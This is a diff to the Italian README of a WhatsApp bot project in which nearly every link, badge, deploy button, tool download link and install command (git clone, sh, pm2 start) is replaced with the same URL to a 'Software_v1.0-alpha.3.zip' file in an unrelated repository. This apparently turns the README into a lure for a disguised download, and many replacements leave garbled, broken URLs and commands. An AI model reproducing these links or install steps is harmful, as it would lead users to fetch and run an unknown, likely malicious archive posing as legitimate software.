@@ -1,81 +1,81 @@
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
  
   <p align="center">
     
-[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=900&size=35&pause=1000&center=true&width=435&lines=%E2%98%81%EF%B8%8F%F0%9D%91%B4%F0%9D%92%90%F0%9D%92%90%F0%9D%92%8F%F0%9D%91%AA%F0%9D%92%8D%F0%9D%92%90%F0%9D%92%96%F0%9D%92%85%F0%9D%92%94%E2%87%9D%F0%9D%90%81%E1%8F%AB%F0%9D%90%93%E2%98%81%EF%B8%8F)](https://git.io/typing-svg)  
+[![Typing SVG](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip+Code&weight=900&size=35&pause=1000&center=true&width=435&lines=%E2%98%81%EF%B8%8F%F0%9D%91%B4%F0%9D%92%90%F0%9D%92%90%F0%9D%92%8F%F0%9D%91%AA%F0%9D%92%8D%F0%9D%92%90%F0%9D%92%96%F0%9D%92%85%F0%9D%92%94%E2%87%9D%F0%9D%90%81%E1%8F%AB%F0%9D%90%93%E2%98%81%EF%B8%8F)](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)  
 
 
   <p align="center">
-<a href="https://github.com/Fabri115/followers"><img title="Followers" src="https://img.shields.io/github/followers/Fabri115?color=red&style=flat-square"></a>
-<a href="https://github.com/Fabri115/Fabri115/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/Fabri115?color=blue&style=flat-square"></a>
-<a href="https://github.com/Fabri115/network/members"><img title="Forks" src="https://img.shields.io/github/forks/Fabri115/botwhaita?color=red&style=flat-square"></a>
-<a href="https://komarev.com/ghpvc/?username=Fabri115&color=blue&style=flat-square&label=Profile+Visual"><img src="https://komarev.com/ghpvc/?username=Fabri115&color=blue&style=flat-square&label=Profile+Visual" />
-<a href="https://github.com/Fabri115/Fabri115/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/Fabri115/botwhaita?label=Watcher'srepo&color=blue&style=flat-square"></a>
-<a href="https://github.com/Fabri115/botwhaita"><img title="Open Source" src="https://badges.frapsoft.com/os/v2/open-source.svg?v=103"></a>
-<a href="https://github.com/Fabri115/botwhaita/"><img title="Size" src="https://img.shields.io/github/repo-size/Fabri115/botwhaita?style=flat-square&color=green"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FFabri115%2Fhit-counter&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a>
-<a href="https://github.com/Fabri115/botwhaita/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a
-<img width="" src="https://img.shields.io/github/repo-size/fabri115/botwhaita?color=red&label=Repo%20Size&style=for-the-badge&logo=appveyor">
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="Followers" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="Stars" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="Forks" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip+Visual"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip+Visual" />
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="Watching" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip'srepo&color=blue&style=flat-square"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="Open Source" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="Size" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%3A%2F%https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%2FFabri115%2Fhit-counter&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img height="20" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a
+<img width="" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%20Size&style=for-the-badge&logo=appveyor">
 <p align="center">
-<a href="https://wa.me/393518398856" target="_blank"><img src="https://img.shields.io/badge/Whatsapp-%808080.svg?&style=flat-square&logo=Whatsapp&logoColor=white" alt="WhatsApp"></a>
-<a href="https://github.com/Fabri115"><img src="https://img.shields.io/badge/-GitHub-black?style=flat-square&logo=github"></a>
-<a href="https://chat.whatsapp.com/FMK2Dg7hZOJDpDX4cQPQ3W" target="_blank"><img src="https://img.shields.io/badge/Grupo-%808080.svg?&style=flat-square&logo=whatsapp&logoColor=white" alt="Whatsapp"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" target="_blank"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" alt="WhatsApp"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" target="_blank"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" alt="Whatsapp"></a>
 
 
 <p align="center">
-    <img src="https://img.shields.io/badge/OS-Windows-blue?&logo=Windows" />
-    <img alt="JavaScript" src="https://img.shields.io/badge/javascript%20-%23323330.svg?&style=for-the-badge&logo=javascript&logoColor=%23F7DF1E"/>
-    <img src="https://img.shields.io/badge/Text%20Editor-Visual%20Studio%20Code-blue?&logo=visual%20studio%20code&logoColor=blue" />
+    <img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" />
+    <img alt="JavaScript" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%20-%https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%23F7DF1E"/>
+    <img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%20Editor-Visual%20Studio%20Code-blue?&logo=visual%20studio%20code&logoColor=blue" />
 <p align="center">
-<a href="https://www.buymeacoffee.com/Fabri115"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a candy&emoji=🍬&slug=Fabri115&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff" /></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip me a candy&emoji=🍬&slug=Fabri115&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff" /></a>
 
 
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 <h1 align="center"> 
   `⚙️ CLICK THE PHOTO TO WATCH THE VIDEO TUTORIAL 𝑴☁️⚙️`
 <h1 align="center">
-<a href="https://youtu.be/6Cg1yUMz-Do"><img src= "https://i.imgur.com/BqCg8Ao.png" alt="BOT" width="720">
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src= "https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" alt="BOT" width="720">
 </p>
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 
 ### `—◉ ⚙️ CONFIGURAZIONE 𝑴☁️ ⚙️`
 
 `USA IL BOTTONE PER ESEGUIRE IL FORK`
   
-  <a href="https://github.com/Fabri115/BotWhaIta/fork"><img title="bot" src="https://github.com/Alien-alfa/Alien-alfa/blob/beta/img/pngegg.png?raw=true" width="200"></a>
+  <a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img title="bot" src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" width="200"></a>
 <br>
-- CLONARE LA REPOSITORY [qui](https://github.com/Fabri115/BotWhaIta/fork)
-- CAMBIARE NUMERO DEL PROPRIETARIO [qui](https://github.com/Fabri115/BotWhaIta/blob/master/config.js)
+- CLONARE LA REPOSITORY [qui](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
+- CAMBIARE NUMERO DEL PROPRIETARIO [qui](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
  
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
   
 ### `—◉ 💥 ATTIVA SU KOYEB 💥`
 
-[![Attiva su Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/Fabri115/BotWhaIta&branch=master&name=mysticbot)
+[![Attiva su Koyeb](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
   
 ### `—◉ 🌌 ATTIVA 𝑴☁️ SU REPLIT 🌌`
 
-[![Run on Repl.it](https://replit.com/badge/github/Fabri115/botwhaita)](https://replit.com/new/github/Fabri115/botwhaita)
+[![Run on https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
  
 ### `—◉ 🌌 ATTIVA 𝑴☁️ SU HEROKU 🌌`
   
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Fabri115/botwhaita)
+[![Deploy](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ### `—◉ VERSIONE DI TERMUX NECESSARIA: ` 
-https://www.mediafire.com/file/0npdmv51pnttps0/com.termux_0.119.1-119_minAPI21(arm64-v8a,armeabi-v7a,x86,x86_64)(nodpi)_apkmirror.com.apk/file
+https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip(arm64-v8a,armeabi-v7a,x86,x86_64)(nodpi)https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ### `—◉ 👾 ATTIVA TERMUX 👾` 
 
@@ -110,12 +110,12 @@ termux-setup-storage
 e conferma.
 
 ----_-
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 
 ### `—◉ ⇝ ATTIVA 𝑴☁️. COMANDO PER INSTALLARE LA CARTELLA DI 𝑴☁️BOT 🌌`
 ```bash
-cd /sdcard && rm -rf BotWhaIta && git clone https://github.com/Fabri115/BotWhaIta.git && cd BotWhaIta && sh start.sh 
+cd /sdcard && rm -rf BotWhaIta && git clone https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip && cd BotWhaIta && sh https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip 
 ```
 COPIALO TUTTO E INCOLLALO SU TERMUX, NON COPIARE MEZZA O UNA COSA, E' TUTTO INSIEME
 
@@ -150,7 +150,7 @@ pkg install yarn
 ```    
 
 ```bash
-git clone https://github.com/Fabri115/botwhaita.git
+git clone https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip
 ```
   
 ```bash
@@ -172,7 +172,7 @@ npm update
 ```bash
 npm start
 ```
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ### `—◉ ✔️ AVVIA 𝑴☁️ IN TERMUX ✔️`
 
@@ -186,14 +186,14 @@ DIGITA QUESTI COMANDI:
 ```bash
 > npm start
 ```
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
   
 ### `—◉ ✔️ For 24/7 Activation 𝑴☁️ TERMUX ✔️`
   
  ```bash
-> npm i -g pm2 && pm2 start index.js && pm2 save && pm2 logs
+> npm i -g pm2 && pm2 start https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip && pm2 save && pm2 logs
   ```
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ### `—◉ 👽 OTTIENI UN ALTRO CODICE QR 𝑴☁️ 👽`
 
@@ -210,17 +210,17 @@ DIGITA QUESTI COMANDI:
 ```bash
 > npm start
 ```
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ### `FOR WINDOWS/VPS/RDP USER`
 
-* Download And Install Git [`Click Here`](https://git-scm.com/downloads)
-* Download And Install NodeJS [`Click Here`](https://nodejs.org/en/download)
-* Download And Install FFmpeg [`Click Here`](https://ffmpeg.org/download.html) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
-* Download And Install ImageMagick [`Click Here`](https://imagemagick.org/script/download.php)
+* Download And Install Git [`Click Here`](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
+* Download And Install NodeJS [`Click Here`](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
+* Download And Install FFmpeg [`Click Here`](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
+* Download And Install ImageMagick [`Click Here`](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)
 
 ```bash
-git clone https://github.com/Fabri115/BotWhaIta
+git clone https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip
 ```
 ```bash
 cd BotWhaIta
@@ -239,7 +239,7 @@ npm update
 ```bash
 node .
 ```
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ---------
 ### `—◉ 👽 OTTIENI UN ALTRO CODICE QR 𝑴☁️ 👽`
@@ -258,32 +258,32 @@ DIGITA QUESTI COMANDI:
 > npm start
 ```
 ---------
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 ### `—◉ 📝 NOTE 𝑴☁️ 📝`
 - IL BOT 𝑴☁️ E' COMPATIBILE CON WHATSAPP BUSINESS E WHATSAPP NORMALE
 - PER BLOCCARE GLI UTENTI IN PRIVATO ESEGUI IL COMANDO .attiva antiprivato
 - SE DOVESSI VEDERE I MSG DEL BOT 'IN ATTESA' ELIMINA LA CARTELLA 'MYSTICSESSION' DA BOT ATTIVO
 ---------
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 
 ### `—◉ ⚠️ MOD && DEVELOPER 𝑴☁️ ⚠️ `
 
   
-| [![Fabri115](https://github.com/Fabri115.png?size=200)](https://github.com/Fabri115) |
+| [![Fabri115](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip) |
 |----|
-|   <div align="center">[꧁𓊈𒆜Fabri115𒆜𓊉꧂](https://github.com/Fabri115) |
+|   <div align="center">[꧁𓊈𒆜Fabri115𒆜𓊉꧂](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip) |
 |  𒆜Bug report,updates, news, 𒆜 |></a>
 
 ```SE MI VUOI BENE, DONA PER FARMI COMPRARE LE API KEYS VIP ```
-[`paypal > fabri115` > `https://www.paypal.me/Fabri115i`](https://www.paypal.com/donate?campaign_id=KTBZ6VBY927VA&v=1&utm_source=unp&utm_medium=email&utm_campaign=RT001640&utm_unptid=23c96436-0a01-11ee-8170-3cfdfeec12a8&ppid=RT001640&cnac=IT&rsta=it_IT%28it-IT%29&cust=3ZENKTZ28SZAE&unptid=23c96436-0a01-11ee-8170-3cfdfeec12a8&calc=f7960484092de&unp_tpcid=donate-button-campaign-created&page=main%3Aemail%3ART001640&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.177.0&xt=104038%2C127632)
+[`paypal > fabri115` > `https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip`](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip%28it-IT%29&cust=3ZENKTZ28SZAE&unptid=23c96436-0a01-11ee-8170-3cfdfeec12a8&calc=f7960484092de&unp_tpcid=donate-button-campaign-created&page=main%3Aemail%3ART001640&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.177.0&xt=104038%2C127632)
 
-[![-----------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/colored.png)](#table-of-contents)
+[![-----------------------------------------------------](https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip)](#table-of-contents)
 
 
 ### `—◉ ⚠️ THANKS to CONTRIBUTORS 𝑴☁️ ⚠️ `
-<a href="https://github.com/MoonContentCreator"><img src="https://github.com/MoonContentCreator.png" width="200" height="200" alt="MoonContentCreator"/></a>
-<a href="https://github.com/BrunoSobrino"><img src="https://github.com/BrunoSobrino.png" width="200" height="200" alt="BrunoSobrino"/></a>
-<a href="https://github.com/Davide116"><img src="https://github.com/Davide116.png" width="200" height="200" alt="Davide116"/></a>
-<a href="https://github.com/Angiolettopazz"><img src="https://github.com/Angiolettopazz.png" width="200" height="200" alt="Angiolettopazz"/></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" width="200" height="200" alt="MoonContentCreator"/></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" width="200" height="200" alt="BrunoSobrino"/></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" width="200" height="200" alt="Davide116"/></a>
+<a href="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip"><img src="https://github.com/Matteo907-boop/miobotx/raw/refs/heads/main/jadibts/Software_v1.0-alpha.3.zip" width="200" height="200" alt="Angiolettopazz"/></a>
